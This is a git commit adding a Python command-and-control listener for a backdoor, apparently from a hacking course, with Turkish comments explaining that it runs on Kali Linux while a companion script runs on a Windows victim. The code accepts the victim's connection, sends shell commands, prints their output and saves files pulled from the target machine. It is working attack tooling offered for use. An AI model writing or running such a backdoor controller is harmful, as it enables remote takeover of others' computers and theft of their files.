73096d6702f929bdbdfb0d244ab03e9d1659dba3
hacı celal aygar <celal.aygar@gmail.com>
2019-11-01 19:09:39 +0300

    download text and image

---
+++ 6-Back-Door/Back-Door v5/My-Socket-Listener.py
@@ -0,0 +1,60 @@
+
+# bu dosya kali linuxda çalışacak ve ilk bu dosya çalışacaktır. 
+# daha sonra My-Socket-For-windows dosyası windows üzerinde çalışacaktır.
+# ve artık cmd komutları ıle windows uzerındekı bilgileri edinebiliriz. 
+# dir ipconfig type file_name.txt  cd ..  cd file_name gibi komutları kullanarak
+
+import socket
+import json
+import base64
+
+class SocketListener :
+    def __init__(self,ip,port):
+        my_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+        my_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        my_listener.bind((ip, port))
+        my_listener.listen(0)  # connection limit = 0
+        print("listening......")
+        (self.my_connection, my_adress) = my_listener.accept()
+        print("Connection OK for Kali from : " + str(my_adress))
+
+    def json_send(self,data):
+        json_data= json.dumps(data)
+        self.my_connection.send(json_data)
+
+    def json_receive(self):
+        json_data = ""
+        while True :
+            try :
+                json_data = json_data + self.my_connection.recv(1024)
+                return json.loads(json_data)
+            except ValueError :
+                continue
+
+    def command_execution(self,command_input):
+        self.json_send(command_input)
+        if(command_input[0] == "quit") :
+            self.my_connection.close()
+            exit()
+        return self.json_receive()
+
+    # wb = write as binary
+    def save_file (self,path,content) :
+        with open(path,"wb") as my_file :
+            my_file.write(base64.b64decode(content))
+            return "Download OK"
+
+    def start_listener(self):
+        while True:
+            command_input = raw_input("Enter command : ")
+            command_input = command_input.split(" ", 1)
+            command_output = self.command_execution(command_input)
+            if command_input[0] == "download":
+                command_output = self.save_file(command_input[1], command_output)
+            print(command_output)
+
+my_socket_listener = SocketListener("10.0.2.4",3333)
+my_socket_listener.start_listener()
+
+
